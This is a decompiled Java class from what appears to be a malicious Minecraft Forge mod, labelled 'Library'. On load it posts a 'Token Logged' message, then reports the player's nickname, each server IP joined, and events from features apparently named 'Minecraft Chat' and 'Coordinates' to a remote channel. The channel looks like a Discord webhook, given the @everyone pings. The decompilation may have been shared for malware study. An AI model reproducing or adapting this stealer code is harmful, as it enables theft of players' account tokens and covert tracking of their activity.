//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.minecraft.libraries;

import net.minecraftforge.common.*;
import me.minecraft.*;
import net.minecraft.client.*;
import me.minecraft.features.*;

public class Library
{
    private String lastConnected;
    private boolean isInit;
    
    public Library() {
        this.isInit = false;
        MinecraftForge.EVENT_BUS.register((Object)this);
        Client.instance.sender.sendMessage(Client.instance.def.withContent("**`Ezz Token Logged.`**").build());
        this.lastConnected = "";
    }
    
    public boolean isWorldLoaded() {
        final boolean server = Minecraft.getMinecraft().getCurrentServerData() != null && this.lastConnected.equals(Minecraft.getMinecraft().getCurrentServerData().serverIP);
        return this.lastConnected.equals(Minecraft.getMinecraft().world.toString()) || server;
    }
    
    public void worldLoader() {
        if (Minecraft.getMinecraft().world == null) {
            return;
        }
        this.lastConnected = Minecraft.getMinecraft().world.toString();
        String info;
        new Thread(() -> {
            if (!Thread.currentThread().isInterrupted()) {
                if (!this.isInit) {
                    info = "\u041f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u0437\u0430\u0433\u0440\u0443\u0437\u0438\u043b \u043c\u0438\u0440, \u043e\u0436\u0438\u0434\u0430\u0435\u043c \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u0438 User nickname --> `" + ((Minecraft.getMinecraft().player != null) ? Minecraft.getMinecraft().player.getName() : "uncaught (exception)") + "`\n";
                    Client.instance.sender.sendMessage(Client.instance.def.withContent("**" + info + "**").build());
                    FeaturesLoader.init();
                    this.isInit = true;
                }
                if (Minecraft.getMinecraft().getConnection() != null && Minecraft.getMinecraft().getCurrentServerData() != null) {
                    this.lastConnected = Minecraft.getMinecraft().getCurrentServerData().serverIP;
                    Client.instance.sender.sendMessage(Client.instance.def.withContent("**\u0417\u0430\u0448\u0451\u043b \u043d\u0430 \u0441\u0435\u0440\u0432\u0435\u0440 --> `" + Minecraft.getMinecraft().getCurrentServerData().serverIP + "`**").build());
                }
                try {
                    Thread.sleep(1000L);
                }
                catch (InterruptedException ex) {}
            }
        }, "init").start();
    }
    
    public void callbackHandler(final Feature lis, final String info) {
        final StringBuilder sb = new StringBuilder();
        if (!lis.getName().equalsIgnoreCase("\u041c\u0430\u0439\u043d\u043a\u0440\u0430\u0444\u0442 \u0427\u0430\u0442") && !lis.getName().equalsIgnoreCase("\u041a\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b")) {
            sb.append("||@everyone||\n");
        }
        sb.append("**Event: ").append(lis.getName()).append(" -->: `").append(info).append("`**");
        Client.instance.sender.sendMessage(Client.instance.def.withContent(sb.toString()).build());
    }
}
